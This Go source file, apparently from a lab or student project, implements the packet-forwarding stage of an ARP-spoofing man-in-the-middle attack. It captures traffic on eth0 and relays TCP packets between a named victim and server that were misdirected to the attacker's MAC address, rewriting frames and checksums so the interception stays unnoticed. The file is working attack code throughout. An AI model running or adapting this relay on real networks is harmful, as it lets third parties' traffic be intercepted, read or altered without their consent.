package main

import (
	"bytes"
	"context"
	"fmt"
	"net"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func createForwardingHandle(nameOfdevice string) *pcap.Handle {
	handle, err := pcap.OpenLive(nameOfdevice, 1600, true, pcap.BlockForever)
	if err != nil {
		panic(err)
	}
	return handle
}

func launchForwarding(global *global, ctx context.Context) {
	handleForwarde := createForwardingHandle("eth0")
	defer handleForwarde.Close()
	// filterByType("ether dst "+global.attaquant_mac.String(), handleForwarde)
	packetSource := gopacket.NewPacketSource(handleForwarde, handleForwarde.LinkType())
	for packet := range packetSource.Packets() {
		select {
		case <-ctx.Done():
			return
		default:
			handleForwarding(handleForwarde, packet, global)
		}
	}
}

func handleForwarding(handle *pcap.Handle, packet gopacket.Packet, global *global) bool {

	if etherLayer := packet.Layer(layers.LayerTypeEthernet); etherLayer != nil {
		layerEther, _ := etherLayer.(*layers.Ethernet)
		if ipLayer := packet.Layer(layers.LayerTypeIPv4); ipLayer != nil {
			layerIp, _ := ipLayer.(*layers.IPv4)
			if tcpLayer := packet.Layer(layers.LayerTypeTCP); tcpLayer != nil {
				layerTcp, _ := tcpLayer.(*layers.TCP)
				fmt.Printf("DEBUG FORWARD: srcMAC=%s dstMAC=%s\n", layerEther.SrcMAC, layerEther.DstMAC)
				forwardingPacket(handle, packet, global, layerEther, layerTcp, layerIp)
				return true
			}
			if icmpLayer := packet.Layer(layers.LayerTypeICMPv4); icmpLayer != nil {
				// handleIcmpPacket(arpLayer, global.attaquant_mac)
				return false
			}
			return false
		}
		if arpLayer := packet.Layer(layers.LayerTypeARP); arpLayer != nil {
			// handleArpPacket(arpLayer, global.attaquant_mac)
			return true
		}
		return false
	}
	return false
}

func forwardingPacket(handle *pcap.Handle, packet gopacket.Packet, global *global, layerEther *layers.Ethernet, layerTcp *layers.TCP, layerIp *layers.IPv4) bool {
	if bytes.Equal(layerEther.SrcMAC, global.victime_mac) && bytes.Equal(layerEther.DstMAC, global.serveur_mac) ||
		bytes.Equal(layerEther.SrcMAC, global.serveur_mac) && bytes.Equal(layerEther.DstMAC, global.victime_mac) {
		fmt.Println("refuse in forward")
		return false
	}
	if layerIp.SrcIP.Equal(global.victime_ip) && layerIp.DstIP.Equal(global.serveur_ip) && bytes.Equal(layerEther.DstMAC, global.attaquant_mac) {
		fmt.Println("client vers serveur")
		err := forwardPacket(handle, global.victime_ip, global.victime_mac, global.serveur_ip, global.serveur_mac, layerEther, layerIp, layerTcp)
		if err != nil {
			fmt.Println(err)
			return false
		}
		return true
	}
	if layerIp.SrcIP.Equal(global.serveur_ip) && layerIp.DstIP.Equal(global.victime_ip) && bytes.Equal(layerEther.DstMAC, global.attaquant_mac) {
		fmt.Println("serveur ver client")
		err := forwardPacket(handle, global.serveur_ip, global.serveur_mac, global.victime_ip, global.victime_mac, layerEther, layerIp, layerTcp)
		if err != nil {
			fmt.Println(err)
			return false
		}
		return true
	}
	return false
}

func forwardPacket(handle *pcap.Handle, ip_to_usurpate net.IP, true_mac net.HardwareAddr, ip_target net.IP, mac_target net.HardwareAddr, layerEther *layers.Ethernet, layerIp *layers.IPv4, layerTcp *layers.TCP) error {

	payload := gopacket.Payload(layerTcp.Payload)
	layerEther.DstMAC = mac_target
	layerTcp.SetNetworkLayerForChecksum(layerIp)
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	if err := gopacket.SerializeLayers(buf, opts, layerEther, layerIp, layerTcp, payload); err != nil {
		return err
	}
	if err := handle.WritePacketData(buf.Bytes()); err != nil {
		return err
	}
	return nil
}
